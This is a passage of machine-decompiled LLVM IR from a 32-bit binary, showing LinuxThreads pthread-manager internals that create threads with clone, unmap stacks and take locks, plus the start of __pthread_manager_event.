  %v3_10016344 = inttoptr i32 %v2_10016344 to i32*
  store i32 %v0_10016344, i32* %v3_10016344, align 4
  %v0_10016348 = load i32, i32* %r26.global-to-local, align 4
  %v1_10016348 = load i32, i32* @r31, align 4
  %v2_10016348 = add i32 %v1_10016348, 400
  %v3_10016348 = inttoptr i32 %v2_10016348 to i32*
  store i32 %v0_10016348, i32* %v3_10016348, align 4
  %v0_1001634c = load i32, i32* %r28.global-to-local, align 4
  %v1_1001634c = load i32, i32* @r31, align 4
  %v2_1001634c = add i32 %v1_1001634c, 16
  %v3_1001634c = inttoptr i32 %v2_1001634c to i32*
  store i32 %v0_1001634c, i32* %v3_1001634c, align 4
  %v0_10016350 = load i32, i32* @r10, align 4
  %v1_10016350 = load i32, i32* @r31, align 4
  %v2_10016350 = add i32 %v1_10016350, 28
  %v3_10016350 = inttoptr i32 %v2_10016350 to i32*
  store i32 %v0_10016350, i32* %v3_10016350, align 4
  %v0_10016354 = load i32, i32* %r6.global-to-local, align 4
  %v1_10016354 = trunc i32 %v0_10016354 to i8
  %v2_10016354 = load i32, i32* @r31, align 4
  %v3_10016354 = add i32 %v2_10016354, 64
  %v4_10016354 = inttoptr i32 %v3_10016354 to i8*
  store i8 %v1_10016354, i8* %v4_10016354, align 1
  %v0_10016358 = load i32, i32* @r31, align 4
  %v2_10016358 = add i32 %v0_10016358, 404
  %v3_10016358 = inttoptr i32 %v2_10016358 to i32*
  store i32 %v0_10016358, i32* %v3_10016358, align 4
  %v0_1001635c = load i32, i32* %r24.global-to-local, align 4
  %v1_1001635c = load i32, i32* @r31, align 4
  %v2_1001635c = add i32 %v1_1001635c, 408
  %v3_1001635c = inttoptr i32 %v2_1001635c to i32*
  store i32 %v0_1001635c, i32* %v3_1001635c, align 4
  %v0_10016360 = load i32, i32* %r4.global-to-local, align 4
  %v1_10016360 = load i32, i32* %r29.global-to-local, align 4
  %v2_10016360 = load i32, i32* %r8.global-to-local, align 4
  %v3_10016360 = add i32 %v2_10016360, %v1_10016360
  %v4_10016360 = inttoptr i32 %v3_10016360 to i32*
  store i32 %v0_10016360, i32* %v4_10016360, align 4
  %v0_10016364 = load i32, i32* %r4.global-to-local, align 4
  %v1_10016364 = load i32, i32* @r10, align 4
  %v2_10016364 = add i32 %v1_10016364, 4
  %v3_10016364 = inttoptr i32 %v2_10016364 to i32*
  store i32 %v0_10016364, i32* %v3_10016364, align 4
  %v0_10016368 = load i32, i32* %r27.global-to-local, align 4
  %v1_10016368 = load i32, i32* @r10, align 4
  %v2_10016368 = add i32 %v1_10016368, 12
  %v3_10016368 = inttoptr i32 %v2_10016368 to i32*
  store i32 %v0_10016368, i32* %v3_10016368, align 4
  %v0_1001636c = load i32, i32* @r31, align 4
  %v1_1001636c = load i32, i32* @r10, align 4
  %v2_1001636c = add i32 %v1_1001636c, 8
  %v3_1001636c = inttoptr i32 %v2_1001636c to i32*
  store i32 %v0_1001636c, i32* %v3_1001636c, align 4
  %v0_10016370 = load i32, i32* %r0.global-to-local, align 4
  %v1_10016370 = load i32, i32* @r31, align 4
  %v2_10016370 = add i32 %v1_10016370, 228
  %v3_10016370 = inttoptr i32 %v2_10016370 to i32*
  store i32 %v0_10016370, i32* %v3_10016370, align 4
  %v0_10016374 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10016374, label %dec_label_pc_100163d8, label %dec_label_pc_10016378

dec_label_pc_10016378:                            ; preds = %dec_label_pc_100162d8
  %v0_10016378 = load i32, i32* @r30, align 4
  %v1_10016378 = inttoptr i32 %v0_10016378 to i32*
  %v2_10016378 = load i32, i32* %v1_10016378, align 4
  store i32 %v2_10016378, i32* %r0.global-to-local, align 4
  %v1_1001637c = trunc i32 %v2_10016378 to i8
  %v2_1001637c = load i32, i32* @r31, align 4
  %v3_1001637c = add i32 %v2_1001637c, 45
  %v4_1001637c = inttoptr i32 %v3_1001637c to i8*
  store i8 %v1_1001637c, i8* %v4_1001637c, align 1
  %v0_10016380 = load i32, i32* @r30, align 4
  %v1_10016380 = add i32 %v0_10016380, 24
  %v2_10016380 = inttoptr i32 %v1_10016380 to i32*
  %v3_10016380 = load i32, i32* %v2_10016380, align 4
  store i32 %v3_10016380, i32* %r0.global-to-local, align 4
  %v1_10016384 = load i32, i32* @r31, align 4
  %v2_10016384 = add i32 %v1_10016384, 392
  %v3_10016384 = inttoptr i32 %v2_10016384 to i32*
  store i32 %v3_10016380, i32* %v3_10016384, align 4
  %v0_10016388 = load i32, i32* @r30, align 4
  %v1_10016388 = add i32 %v0_10016388, 12
  %v2_10016388 = inttoptr i32 %v1_10016388 to i32*
  %v3_10016388 = load i32, i32* %v2_10016388, align 4
  store i32 %v3_10016388, i32* %r0.global-to-local, align 4
  %v3_1001638c = icmp eq i32 %v3_10016388, 0
  store i1 %v3_1001638c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001638c, label %dec_label_pc_100163b8, label %dec_label_pc_10016394

dec_label_pc_10016394:                            ; preds = %dec_label_pc_10016378
  %v3_10016394 = icmp eq i32 %v3_10016388, 1
  store i1 %v3_10016394, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016394, label %dec_label_pc_1001639c, label %dec_label_pc_100163d0

dec_label_pc_1001639c:                            ; preds = %dec_label_pc_10016394
  %v1_1001639c = add i32 %v0_10016388, 4
  %v2_1001639c = inttoptr i32 %v1_1001639c to i32*
  %v3_1001639c = load i32, i32* %v2_1001639c, align 4
  store i32 %v3_1001639c, i32* %r0.global-to-local, align 4
  %v0_100163a0 = load i32, i32* @r31, align 4
  %v1_100163a0 = add i32 %v0_100163a0, 232
  store i32 %v1_100163a0, i32* @r3, align 4
  %v1_100163a4 = add i32 %v0_10016388, 8
  store i32 %v1_100163a4, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v2_100163ac = add i32 %v0_100163a0, 228
  %v3_100163ac = inttoptr i32 %v2_100163ac to i32*
  store i32 %v3_1001639c, i32* %v3_100163ac, align 4
  store i32 ptrtoint (i32* @global_var_100163b4.1074 to i32), i32* @lr, align 4
  %v0_100163b0 = call i32 @memcpy()
  store i32 %v0_100163b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100163d0

dec_label_pc_100163b8:                            ; preds = %dec_label_pc_10016378
  %v0_100163b8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100163b8, i32* %r3.global-to-local, align 4
  store i32 268526528, i32* @lr, align 4
  %v1_100163bc = call i32 @sched_getscheduler(i32 %v0_100163b8)
  %v0_100163c0 = load i32, i32* @r31, align 4
  %v1_100163c0 = add i32 %v0_100163c0, 232
  store i32 %v1_100163c0, i32* %r4.global-to-local, align 4
  %v2_100163c4 = add i32 %v0_100163c0, 228
  %v3_100163c4 = inttoptr i32 %v2_100163c4 to i32*
  store i32 %v1_100163bc, i32* %v3_100163c4, align 4
  %v0_100163c8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_100163c8, i32* %r3.global-to-local, align 4
  store i32 268526544, i32* @lr, align 4
  %v2_100163cc = call i32 @sched_getparam(i32 %v0_100163c8, i32 %v1_100163c0)
  store i32 %v2_100163cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100163d0

dec_label_pc_100163d0:                            ; preds = %dec_label_pc_10016394, %dec_label_pc_1001639c, %dec_label_pc_100163b8
  %v0_100163d0 = load i32, i32* @r31, align 4
  %v1_100163d0 = add i32 %v0_100163d0, 232
  %v2_100163d0 = inttoptr i32 %v1_100163d0 to i32*
  %v3_100163d0 = load i32, i32* %v2_100163d0, align 4
  store i32 %v3_100163d0, i32* %r0.global-to-local, align 4
  %v2_100163d4 = add i32 %v0_100163d0, 24
  %v3_100163d4 = inttoptr i32 %v2_100163d4 to i32*
  store i32 %v3_100163d0, i32* %v3_100163d4, align 4
  br label %dec_label_pc_100163d8

dec_label_pc_100163d8:                            ; preds = %dec_label_pc_100162d8, %dec_label_pc_100163d0
  %v0_100163d8 = load i32, i32* %r20.global-to-local, align 4
  %v1_100163d8 = load i32, i32* @r31, align 4
  %v2_100163d8 = add i32 %v1_100163d8, 92
  %v3_100163d8 = inttoptr i32 %v2_100163d8 to i32*
  store i32 %v0_100163d8, i32* %v3_100163d8, align 4
  store i32 %v2_100163dc, i32* @r4, align 4
  %v0_100163e0 = load i32, i32* %r19.global-to-local, align 4
  %v1_100163e0 = load i32, i32* @r31, align 4
  %v2_100163e0 = add i32 %v1_100163e0, 96
  %v3_100163e0 = inttoptr i32 %v2_100163e0 to i32*
  store i32 %v0_100163e0, i32* %v3_100163e0, align 4
  store i32 128, i32* @r5, align 4
  %v0_100163e8 = load i32, i32* @r31, align 4
  %v1_100163e8 = add i32 %v0_100163e8, 100
  store i32 %v1_100163e8, i32* @r3, align 4
  store i32 268526576, i32* @lr, align 4
  %v0_100163ec = call i32 @memcpy()
  store i32 %v0_100163ec, i32* %r3.global-to-local, align 4
  %v0_100163f0 = load i32, i32* @r31, align 4
  %v1_100163f0 = add i32 %v0_100163f0, 24
  %v2_100163f0 = inttoptr i32 %v1_100163f0 to i32*
  %v3_100163f0 = load i32, i32* %v2_100163f0, align 4
  store i32 %v3_100163f0, i32* %r3.global-to-local, align 4
  store i32 268526584, i32* @lr, align 4
  %v1_100163f4 = call i32 @__pthread_manager_adjust_prio(i32 %v3_100163f0)
  store i32 %v1_100163f4, i32* %r3.global-to-local, align 4
  store i32 268697600, i32* %r11.global-to-local, align 4
  %v3_100163fc = load i32, i32* @global_var_100450e0, align 4
  %v0_10016400 = load i32, i32* %r18.global-to-local, align 4
  %v3_10016400 = icmp eq i32 %v0_10016400, 0
  store i1 %v3_10016400, i1* %cr7_eq.global-to-local, align 1
  %v1_10016404 = load i32, i32* @r31, align 4
  %v2_10016404 = add i32 %v1_10016404, 4
  %v3_10016404 = inttoptr i32 %v2_10016404 to i32*
  store i32 %v3_100163fc, i32* %v3_10016404, align 4
  %v3_10016408 = load i32, i32* @global_var_100450e0, align 4
  store i32 %v3_10016408, i32* %r0.global-to-local, align 4
  %v1_10016410 = load i32, i32* @r31, align 4
  %v2_10016410 = inttoptr i32 %v1_10016410 to i32*
  store i32 %v3_10016408, i32* %v2_10016410, align 4
  %v3_10016414 = load i32, i32* @global_var_100450e0, align 4
  %v0_1001641c = load i32, i32* @r31, align 4
  %v2_1001641c = add i32 %v3_10016414, 4
  %v3_1001641c = inttoptr i32 %v2_1001641c to i32*
  store i32 %v0_1001641c, i32* %v3_1001641c, align 4
  %v3_10016420 = load i32, i32* @global_var_100450e0, align 4
  store i32 %v3_10016420, i32* %r9.global-to-local, align 4
  %v0_10016424 = load i32, i32* @r31, align 4
  %v2_10016424 = inttoptr i32 %v3_10016420 to i32*
  store i32 %v0_10016424, i32* %v2_10016424, align 4
  br i1 %v3_10016400, label %dec_label_pc_100164ac, label %dec_label_pc_1001642c

dec_label_pc_1001642c:                            ; preds = %dec_label_pc_100163d8
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016430 = load i32, i32* @global_var_10045210.1011, align 4
  store i32 %v3_10016430, i32* %r0.global-to-local, align 4
  %v0_10016434 = load i32, i32* %r23.global-to-local, align 4
  %v1_10016434 = add i32 %v0_10016434, 416
  %v2_10016434 = inttoptr i32 %v1_10016434 to i32*
  %v3_10016434 = load i32, i32* %v2_10016434, align 4
  %v2_10016438 = or i32 %v3_10016434, %v3_10016430
  store i32 %v2_10016438, i32* %r0.global-to-local, align 4
  %v1_1001643c = and i32 %v2_10016438, 128
  store i32 %v1_1001643c, i32* %r9.global-to-local, align 4
  %v3_1001643c = icmp eq i32 %v1_1001643c, 0
  br i1 %v3_1001643c, label %dec_label_pc_100164ac, label %dec_label_pc_10016444

dec_label_pc_10016444:                            ; preds = %dec_label_pc_1001642c
  %v0_10016444 = load i32, i32* @r31, align 4
  %v1_10016444 = add i32 %v0_10016444, 28
  %v2_10016444 = inttoptr i32 %v1_10016444 to i32*
  %v3_10016444 = load i32, i32* %v2_10016444, align 4
  store i32 %v3_10016444, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268526672, i32* @lr, align 4
  %v0_1001644c = call i32 @__pthread_lock()
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10016454 = load i32, i32* @global_var_10045108.994, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 23920), i32* %r3.global-to-local, align 4
  %v0_10016460 = load i32, i32* @r31, align 4
  store i32 %v0_10016460, i32* %r4.global-to-local, align 4
  %v1_10016464 = or i32 %v3_10016454, 3840
  store i32 %v0_10016460, i32* %r6.global-to-local, align 4
  store i32 268526708, i32* @lr, align 4
  %v4_10016470 = call i32 @clone(i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 23920), i32 %v0_10016460, i32 %v1_10016464, i32 %v0_10016460)
  store i32 %v4_10016470, i32* @r3, align 4
  %v3_10016474 = icmp eq i32 %v4_10016470, -1
  store i1 %v3_10016474, i1* %cr7_eq.global-to-local, align 1
  store i32 %v4_10016470, i32* %r29.global-to-local, align 4
  br i1 %v3_10016474, label %dec_label_pc_100164d4.thread, label %dec_label_pc_100164a4

dec_label_pc_100164d4.thread:                     ; preds = %dec_label_pc_10016444
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_100164dc

dec_label_pc_100164a4:                            ; preds = %dec_label_pc_10016444
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v1_10016488 = load i32, i32* @r31, align 4
  %v2_10016488 = add i32 %v1_10016488, 424
  %v3_10016488 = inttoptr i32 %v2_10016488 to i32*
  store i32 8, i32* %v3_10016488, align 4
  %v0_1001648c = load i32, i32* @r31, align 4
  %v2_1001648c = add i32 %v0_1001648c, 428
  %v3_1001648c = inttoptr i32 %v2_1001648c to i32*
  store i32 %v0_1001648c, i32* %v3_1001648c, align 4
  %v0_10016490 = load i32, i32* @r31, align 4
  store i32 %v0_10016490, i32* @global_var_10045218.1019, align 4
  %v2_10016494 = add i32 %v0_10016490, 20
  %v3_10016494 = inttoptr i32 %v2_10016494 to i32*
  store i32 %v4_10016470, i32* %v3_10016494, align 4
  %v1_10016498 = call i32 @__linuxthreads_create_event(i32 268697600)
  store i32 %v1_10016498, i32* %r3.global-to-local, align 4
  %v0_1001649c = load i32, i32* @r31, align 4
  %v1_1001649c = add i32 %v0_1001649c, 28
  %v2_1001649c = inttoptr i32 %v1_1001649c to i32*
  %v3_1001649c = load i32, i32* %v2_1001649c, align 4
  store i32 %v3_1001649c, i32* @r3, align 4
  store i32 268526756, i32* @lr, align 4
  %v0_100164a0 = call i32 @__pthread_unlock()
  store i32 %v0_100164a0, i32* %r3.global-to-local, align 4
  %v0_100164a4.pr = load i32, i32* %r29.global-to-local, align 4
  %v3_100164a4 = icmp eq i32 %v0_100164a4.pr, 0
  store i1 %v3_100164a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100164a4, label %dec_label_pc_100164ac, label %dec_label_pc_100164d4

dec_label_pc_100164ac:                            ; preds = %dec_label_pc_100164a4, %dec_label_pc_1001642c, %dec_label_pc_100163d8
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100164b4 = load i32, i32* @global_var_10045108.994, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 23688), i32* %r3.global-to-local, align 4
  %v0_100164bc = load i32, i32* @r31, align 4
  store i32 %v0_100164bc, i32* %r4.global-to-local, align 4
  store i32 %v0_100164bc, i32* %r6.global-to-local, align 4
  %v1_100164c4 = or i32 %v3_100164b4, 3840
  store i32 268526800, i32* @lr, align 4
  %v4_100164cc = call i32 @clone(i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 23688), i32 %v0_100164bc, i32 %v1_100164c4, i32 %v0_100164bc)
  store i32 %v4_100164cc, i32* %r3.global-to-local, align 4
  store i32 %v4_100164cc, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100164d4

dec_label_pc_100164d4:                            ; preds = %dec_label_pc_100164a4, %dec_label_pc_100164ac
  %v0_10016570 = phi i32 [ %v4_100164cc, %dec_label_pc_100164ac ], [ %v0_100164a4.pr, %dec_label_pc_100164a4 ]
  %v3_100164d4 = icmp eq i32 %v0_10016570, -1
  store i1 %v3_100164d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100164d4, label %dec_label_pc_100164dc, label %dec_label_pc_10016570

dec_label_pc_100164dc:                            ; preds = %dec_label_pc_100164d4.thread, %dec_label_pc_100164d4
  %v0_100164dc = load i32, i32* @r31, align 4
  %v1_100164dc = inttoptr i32 %v0_100164dc to i32*
  %v2_100164dc = load i32, i32* %v1_100164dc, align 4
  store i32 %v2_100164dc, i32* %r11.global-to-local, align 4
  %v0_100164e0 = load i32, i32* @r30, align 4
  %v3_100164e0 = icmp eq i32 %v0_100164e0, 0
  store i1 %v3_100164e0, i1* %cr7_eq.global-to-local, align 1
  %v1_100164e4 = add i32 %v0_100164dc, 4
  %v2_100164e4 = inttoptr i32 %v1_100164e4 to i32*
  %v3_100164e4 = load i32, i32* %v2_100164e4, align 4
  store i32 %v3_100164e4, i32* %r0.global-to-local, align 4
  %v2_100164e8 = add i32 %v2_100164dc, 4
  %v3_100164e8 = inttoptr i32 %v2_100164e8 to i32*
  store i32 %v3_100164e4, i32* %v3_100164e8, align 4
  %v0_100164ec = load i32, i32* @r31, align 4
  %v1_100164ec = add i32 %v0_100164ec, 4
  %v2_100164ec = inttoptr i32 %v1_100164ec to i32*
  %v3_100164ec = load i32, i32* %v2_100164ec, align 4
  store i32 %v3_100164ec, i32* %r9.global-to-local, align 4
  %v0_100164f0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100164f0 = inttoptr i32 %v3_100164ec to i32*
  store i32 %v0_100164f0, i32* %v2_100164f0, align 4
  br i1 %v3_100164e0, label %dec_label_pc_10016504, label %dec_label_pc_100164f8

dec_label_pc_100164f8:                            ; preds = %dec_label_pc_100164dc
  %v0_100164f8 = load i32, i32* @r30, align 4
  %v1_100164f8 = add i32 %v0_100164f8, 24
  %v2_100164f8 = inttoptr i32 %v1_100164f8 to i32*
  %v3_100164f8 = load i32, i32* %v2_100164f8, align 4
  store i32 %v3_100164f8, i32* %r0.global-to-local, align 4
  %v3_100164fc = icmp eq i32 %v3_100164f8, 0
  store i1 %v3_100164fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100164fc, label %dec_label_pc_10016504, label %dec_label_pc_10016530

dec_label_pc_10016504:                            ; preds = %dec_label_pc_100164f8, %dec_label_pc_100164dc
  %v0_10016504 = load i32, i32* @r31, align 4
  %v1_10016504 = add i32 %v0_10016504, 400
  %v2_10016504 = inttoptr i32 %v1_10016504 to i32*
  %v3_10016504 = load i32, i32* %v2_10016504, align 4
  store i32 %v3_10016504, i32* %r4.global-to-local, align 4
  %v3_10016508 = icmp eq i32 %v3_10016504, 0
  store i1 %v3_10016508, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10016508, label %dec_label_pc_10016518, label %dec_label_pc_10016510

dec_label_pc_10016510:                            ; preds = %dec_label_pc_10016504
  %v1_10016510 = add i32 %v0_10016504, 396
  %v2_10016510 = inttoptr i32 %v1_10016510 to i32*
  %v3_10016510 = load i32, i32* %v2_10016510, align 4
  store i32 %v3_10016510, i32* %r3.global-to-local, align 4
  store i32 268526872, i32* @lr, align 4
  %v2_10016514 = call i32 @munmap(i32 %v3_10016510, i32 %v3_10016504)
  store i32 %v2_10016514, i32* %r3.global-to-local, align 4
  %v1_10016524.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10016518

dec_label_pc_10016518:                            ; preds = %dec_label_pc_10016504, %dec_label_pc_10016510
  %v1_10016524 = phi i32 [ %v0_10016504, %dec_label_pc_10016504 ], [ %v1_10016524.pre, %dec_label_pc_10016510 ]
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_1001651c = load i32, i32* @global_var_10045254.1006, align 4
  %v1_10016520 = mul i32 %v3_1001651c, 4
  store i32 %v1_10016520, i32* %r4.global-to-local, align 4
  %v2_10016524 = sub i32 %v1_10016524, %v1_10016520
  %v1_10016528 = add i32 %v2_10016524, 480
  store i32 %v1_10016528, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016530.1075 to i32), i32* @lr, align 4
  %v2_1001652c = call i32 @munmap(i32 %v1_10016528, i32 %v1_10016520)
  store i32 %v2_1001652c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016530

dec_label_pc_10016530:                            ; preds = %dec_label_pc_100164f8, %dec_label_pc_10016518
  store i32 268697600, i32* %r8.global-to-local, align 4
  %v3_10016538 = load i32, i32* @global_var_10045120.1061, align 4
  store i32 ptrtoint (i32* @global_var_10040d60.1027 to i32), i32* %r9.global-to-local, align 4
  %v0_10016540 = load i32, i32* %r24.global-to-local, align 4
  %v1_10016540 = mul i32 %v0_10016540, 16
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10016548 = add i32 %v1_10016540, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %v2_10016548, i32* %r11.global-to-local, align 4
  %v1_1001654c = add i32 %v3_10016538, -1
  store i32 %v1_1001654c, i32* %r10.global-to-local, align 4
  %v2_10016550 = add i32 %v1_10016540, add (i32 ptrtoint (i32* @global_var_10040d60.1027 to i32), i32 12)
  %v3_10016550 = inttoptr i32 %v2_10016550 to i32*
  store i32 0, i32* %v3_10016550, align 4
  %v0_10016554 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10016554, i32* @global_var_10045120.1061, align 4
  %v0_10016558 = load i32, i32* %r0.global-to-local, align 4
  %v1_10016558 = load i32, i32* %r11.global-to-local, align 4
  %v2_10016558 = add i32 %v1_10016558, 8
  %v3_10016558 = inttoptr i32 %v2_10016558 to i32*
  store i32 %v0_10016558, i32* %v3_10016558, align 4
  %v0_1001655c = call i32 @__errno_location()
  store i32 %v0_1001655c, i32* %r3.global-to-local, align 4
  %v1_10016560 = inttoptr i32 %v0_1001655c to i32*
  %v2_10016560 = load i32, i32* %v1_10016560, align 4
  store i32 %v2_10016560, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001657c

dec_label_pc_10016568:                            ; preds = %dec_label_pc_100162d0
  store i32 11, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001657c

dec_label_pc_10016570:                            ; preds = %dec_label_pc_100164d4
  %v1_10016570 = load i32, i32* @r31, align 4
  %v2_10016570 = add i32 %v1_10016570, 20
  %v3_10016570 = inttoptr i32 %v2_10016570 to i32*
  store i32 %v0_10016570, i32* %v3_10016570, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10016578 = load i32, i32* %r28.global-to-local, align 4
  %v1_10016578 = load i32, i32* %r23.global-to-local, align 4
  %v2_10016578 = add i32 %v1_10016578, 48
  %v3_10016578 = inttoptr i32 %v2_10016578 to i32*
  store i32 %v0_10016578, i32* %v3_10016578, align 4
  %v0_1001657c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001657c

dec_label_pc_1001657c:                            ; preds = %dec_label_pc_10016198, %dec_label_pc_10016568, %dec_label_pc_10016530, %dec_label_pc_10016570
  %v0_1001657c = phi i32 [ 1, %dec_label_pc_10016198 ], [ 11, %dec_label_pc_10016568 ], [ %v2_10016560, %dec_label_pc_10016530 ], [ %v0_1001657c.pre, %dec_label_pc_10016570 ]
  %v1_1001657c = load i32, i32* %r23.global-to-local, align 4
  %v2_1001657c = add i32 %v1_1001657c, 52
  %v3_1001657c = inttoptr i32 %v2_1001657c to i32*
  store i32 %v0_1001657c, i32* %v3_1001657c, align 4
  %v3_10016580 = load i32, i32* %stack_var_-224, align 4
  store i32 %v3_10016580, i32* @r3, align 4
  br label %dec_label_pc_1001668c

dec_label_pc_1001668c:                            ; preds = %dec_label_pc_100160ec, %dec_label_pc_1001657c
  store i32 268527248, i32* @lr, align 4
  %v0_1001668c = call i32 @restart.4()
  store i32 %v0_1001668c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100160cc

; uselistorder directives
  uselistorder i32 %v1_10016540, { 1, 0 }
  uselistorder i32 %v1_10016520, { 2, 1, 0 }
  uselistorder i32 %v0_1001648c, { 1, 0 }
  uselistorder i32 %v0_10016460, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10016358, { 1, 0 }
  uselistorder i32 %v1_1001630c, { 1, 0 }
  uselistorder i32 %v1_100162d0, { 2, 3, 1, 0 }
  uselistorder i32 %v3_10016298, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10016268, { 2, 1, 0 }
  uselistorder i32 %v2_1001625c, { 1, 0 }
  uselistorder i32 %v2_10016238, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10016220, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10016220, { 1, 0, 2 }
  uselistorder i32 %v3_100161ec, { 1, 0, 2 }
  uselistorder i1 %v3_100161d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100161d0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_100161b8, { 1, 0 }
  uselistorder i32 %v0_10016258, { 2, 0, 1 }
  uselistorder i32 %v3_1001616c, { 1, 0, 2 }
  uselistorder i32 %v2_10016014, { 3, 2, 1, 0, 5, 4, 7, 6, 9, 8 }
  uselistorder i32* %stack_var_-360, { 1, 0 }
  uselistorder i32 %tmp16, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 22, 18, 19, 23, 24, 25, 27, 26 }
  uselistorder i32* %r3.global-to-local, { 28, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 47, 27, 31, 32, 33, 29, 30, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 0 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r26.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r25.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r24.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 31, 21, 22, 23, 24, 26, 25, 20, 28, 27, 29, 30 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 3, 4, 31, 5, 6, 7, 8, 9, 10, 19, 11, 12, 13, 14, 15, 16, 17, 18, 33, 30, 29, 32, 21, 22, 23, 20, 24, 25, 26, 27, 28 }
  uselistorder i32 ()* @restart.4, { 1, 0 }
  uselistorder i32 (i32, i32)* @munmap, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__linuxthreads_create_event, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 3, 2, 1, 0 }
  uselistorder i32 3840, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @sched_getparam, { 1, 0 }
  uselistorder i32 (i32)* @sched_getscheduler, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 2097152, { 4, 1, 5, 2, 3, 0, 6, 7 }
  uselistorder i32 ()* @__GI_getpagesize, { 3, 2, 1, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e0b8.1071 to i32), { 0, 2, 1 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 2, 1, 0 }
  uselistorder i32* @global_var_100450e0, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @global_var_10040b08.1064, { 1, 0 }
  uselistorder label %dec_label_pc_1001668c, { 1, 0 }
  uselistorder label %dec_label_pc_1001657c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10016530, { 1, 0 }
  uselistorder label %dec_label_pc_10016518, { 1, 0 }
  uselistorder label %dec_label_pc_100164dc, { 1, 0 }
  uselistorder label %dec_label_pc_100164d4, { 1, 0 }
  uselistorder label %dec_label_pc_100163d8, { 1, 0 }
  uselistorder label %dec_label_pc_100163d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100162d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001624c, { 1, 0 }
  uselistorder label %dec_label_pc_100161b4, { 1, 0 }
  uselistorder label %dec_label_pc_10016118, { 1, 0 }
  uselistorder label %dec_label_pc_100160cc, { 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_100160c0, { 1, 0 }
  uselistorder label %dec_label_pc_10016074, { 2, 0, 1 }
}

define i32 @__pthread_manager_event(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 0, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  %v3_100166e4 = load i32, i32* bitcast (i32** @global_var_10040adc.1015 to i32*), align 4
  store i32 %v3_100166e4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10040ac0.1013 to i32), i32* @r2, align 4
  store i32 268527348, i32* @lr, align 4
  %v0_100166f0 = call i32 @__pthread_lock()
  %v3_100166f4 = load i32, i32* bitcast (i32** @global_var_10040adc.1015 to i32*), align 4
  store i32 %v3_100166f4, i32* @r3, align 4
  store i32 268527356, i32* @lr, align 4
  %v0_100166f8 = call i32 @__pthread_unlock()
  %v0_100166fc = load i32, i32* %r28.global-to-local, align 4
